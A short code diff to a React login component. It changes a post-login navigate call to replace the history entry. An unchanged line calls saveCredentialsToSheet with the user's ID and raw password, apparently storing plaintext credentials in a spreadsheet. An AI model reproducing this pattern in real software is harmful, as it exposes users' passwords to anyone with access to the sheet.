@@ -207,7 +207,7 @@ const Login = () => {
                 }
 
                 saveCredentialsToSheet(cleanId, password);
-                navigate('/attendance-register');
+                navigate('/attendance-register', { replace: true });
             }
         } catch (err) {
             console.error("Login failed:", err);
